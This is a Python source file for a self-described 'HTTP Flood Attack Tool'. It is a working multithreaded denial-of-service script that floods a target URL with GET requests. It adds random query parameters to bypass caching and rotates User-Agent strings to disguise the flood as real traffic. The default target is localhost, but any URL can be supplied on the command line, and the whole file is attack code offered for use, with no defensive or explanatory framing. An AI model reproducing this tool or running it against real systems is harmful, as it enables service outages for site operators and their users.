# http_flood_attack.py
import requests
import threading
import time
import argparse
from concurrent.futures import ThreadPoolExecutor
import random

class HTTPFloodAttack:
    def __init__(self, target_url, num_threads=20, request_delay=0.01):
        self.target_url = target_url
        self.num_threads = num_threads
        self.request_delay = request_delay
        self.attack_running = True
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.start_time = None

    def send_request(self):
        """Send a single HTTP request"""
        try:
            # Random parameters to bypass caching
            params = {'nocache': random.randint(1, 1000000)}
            # Random user agents to look more like real traffic
            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
                    'Mozilla/5.0 (Linux; Android 11; Pixel 5)'
                ]),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
            
            response = requests.get(
                self.target_url,
                params=params,
                headers=headers,
                timeout=2
            )
            self.successful_requests += 1
            return response.status_code
        except Exception as e:
            self.failed_requests += 1
            return str(e)

    def attack_thread(self):
        """Single attack thread function"""
        while self.attack_running:
            status = self.send_request()
            self.total_requests += 1
            time.sleep(self.request_delay)

    def print_stats(self):
        """Print attack statistics"""
        while self.attack_running:
            time.sleep(1)
            duration = time.time() - self.start_time
            rps = self.total_requests / duration
            print(f"\rRequests: {self.total_requests} | "
                  f"Successful: {self.successful_requests} | "
                  f"Failed: {self.failed_requests} | "
                  f"RPS: {rps:.2f}", end='')

    def start_attack(self):
        """Start the HTTP flood attack"""
        print(f"Starting HTTP flood attack on {self.target_url}")
        print(f"Using {self.num_threads} threads")
        
        self.start_time = time.time()
        
        # Create thread pool for attack threads
        with ThreadPoolExecutor(max_workers=self.num_threads) as executor:
            # Start attack threads
            attack_futures = [
                executor.submit(self.attack_thread)
                for _ in range(self.num_threads)
            ]
            
            # Start stats printing thread
            stats_thread = threading.Thread(target=self.print_stats)
            stats_thread.daemon = True
            stats_thread.start()
            
            try:
                while True:
                    time.sleep(0.1)
            except KeyboardInterrupt:
                print("\nStopping attack...")
                self.attack_running = False
                for future in attack_futures:
                    future.cancel()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='HTTP Flood Attack Tool')
    parser.add_argument('--url', default='http://localhost:5000',
                      help='Target URL (default: http://localhost:5000)')
    parser.add_argument('--threads', type=int, default=20,
                      help='Number of threads (default: 20)')
    parser.add_argument('--delay', type=float, default=0.01,
                      help='Delay between requests in seconds (default: 0.01)')
    
    args = parser.parse_args()
    
    attack = HTTPFloodAttack(
        target_url=args.url,
        num_threads=args.threads,
        request_delay=args.delay
    )
    attack.start_attack()